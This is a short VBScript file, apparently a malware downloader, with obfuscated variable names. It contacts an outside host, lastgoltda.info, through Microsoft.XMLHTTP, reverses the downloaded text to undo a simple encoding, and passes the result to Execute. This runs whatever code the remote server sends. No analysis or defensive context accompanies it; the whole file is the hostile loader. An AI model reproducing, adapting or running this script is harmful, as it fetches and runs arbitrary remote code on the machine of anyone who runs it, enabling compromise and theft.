bIO0r="ehTGMoAPe1LVz5lPKbsTnW8r4"
URL="http://lastgoltda.info/?c=v3&" & bIO0r
set GFFvM=CreateObject("Microsoft.XMLHTTP")

GFFvM.open "GET",URL,false
GFFvM.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
GFFvM.setRequestHeader "User-Agent", "RemoveIT"
GFFvM.send "Z"

For i = Len(GFFvM.responsetext) to 1  Step-1
    var= Mid(GFFvM.responsetext,  i  , 1)
    Qfj5c = Qfj5c & var
Next

execute "Execute Qfj5c & bIO0rGFFvM"
